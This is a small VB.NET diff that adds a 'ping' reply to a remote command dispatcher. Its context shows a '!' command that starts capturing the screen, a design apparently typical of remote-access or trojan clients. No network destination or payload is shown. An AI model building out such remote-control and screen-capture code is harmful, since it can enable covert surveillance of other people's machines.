@@ -77,6 +77,8 @@ Public Class Main
         Dim A As String() = Split(BS(b), SPL)
         Try
             Select Case A(0)
+                Case "ping"
+                    C.Send("ping")
                 Case "!"
                     cap.Clear()
                     Dim s = Screen.PrimaryScreen.Bounds.Size
